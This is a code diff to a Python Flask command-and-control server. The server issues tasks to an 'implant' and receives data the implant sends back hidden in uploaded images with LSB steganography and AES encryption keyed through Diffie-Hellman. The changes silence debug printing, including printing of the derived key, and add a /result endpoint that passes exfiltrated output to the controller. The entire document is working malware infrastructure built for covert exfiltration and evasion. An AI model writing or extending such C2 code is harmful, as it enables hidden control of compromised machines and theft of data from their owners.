@@ -7,6 +7,8 @@ from stegano import lsb
 from diffiehellman import DiffieHellman
 
 shared_key = None
+latest_result = None
+
 app = Flask(__name__)
 
 # Predefined command menu
@@ -30,7 +32,7 @@ def encrypt(plain_str):
     cipher = AES.new(shared_key, AES.MODE_CBC)
     plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
     encrypted = cipher.encrypt(plaintext)
-    print(f"[*] Encrypted Message: {encrypted})")
+    # print(f"[*] Encrypted Message: {encrypted})")
     res = encrypted + cipher.iv
     return res.decode('latin-1')
 
@@ -43,7 +45,7 @@ def decrypt(ciphertext):
     msg = ciphertext[:-16]
     plaintext = cipher.decrypt(msg)
     plaintext = plaintext[:-plaintext[len(plaintext)-1]]
-    print(f"[*] Unencrypted Message: {plaintext.decode()}")
+    # print(f"[*] Unencrypted Message: {plaintext.decode()}")
     return plaintext.decode()
 
 # A controller can invoke the default endpoint to view the command menu
@@ -60,13 +62,13 @@ def get_public_key():
 @app.route('/sendkey', methods=['POST'])
 def send_public_key():
     global shared_key
-    print("in endpoint")
+    # print("in endpoint")
     res = request.get_json()
     #print(res)
     res = res["key"]
     #print(f"[+] client public key: {res.encode('latin-1')}")
     shared_key = dh1.generate_shared_key(res.encode('latin-1'))[:16]
-    print(f"[+] Derived AES key: {shared_key}")
+    # print(f"[+] Derived AES key: {shared_key}")
     return jsonify({"Success": "Yay"}), 200
 
 # A controller can invoke this endpoint to task the client
@@ -100,6 +102,7 @@ def get_task():
 # Implant invokes this endpoint to send images back to the server
 @app.route('/upload', methods=['POST'])
 def receive_data():
+    global latest_result
     file = request.files.get('file')
     if file:
         filename = file.filename
@@ -114,15 +117,23 @@ def receive_data():
         
         deobfuscated_data = lsb.reveal(save_path)
         output = decrypt(deobfuscated_data)
-        print(output)
+        latest_result = output
         
         return jsonify({"Success": "Yay"}), 200
 
     else:
         return jsonify({"error": "No file provided"}), 400
     
+@app.route('/result', methods=['GET'])
+def get_result():
+    global latest_result
+    if latest_result:
+        result = latest_result
+        latest_result = None
+        return jsonify({"result": result}), 200
+    else:
+        return jsonify({"result": None}), 204
     
-
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
